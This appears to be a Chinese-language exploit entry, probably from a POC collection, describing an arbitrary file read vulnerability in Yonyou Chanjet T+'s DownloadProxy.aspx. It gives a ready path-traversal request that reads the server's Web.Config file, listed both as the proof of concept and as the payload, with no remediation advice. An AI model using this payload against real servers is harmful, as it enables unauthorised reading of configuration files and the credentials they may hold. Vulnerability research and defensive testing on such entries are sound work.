# 用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞

## 漏洞描述
用友 畅捷通T+ DownloadProxy.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面

![image-20220909104559292](images/202209091045361.png)

验证POC

```
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```


## Payloads
```
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```
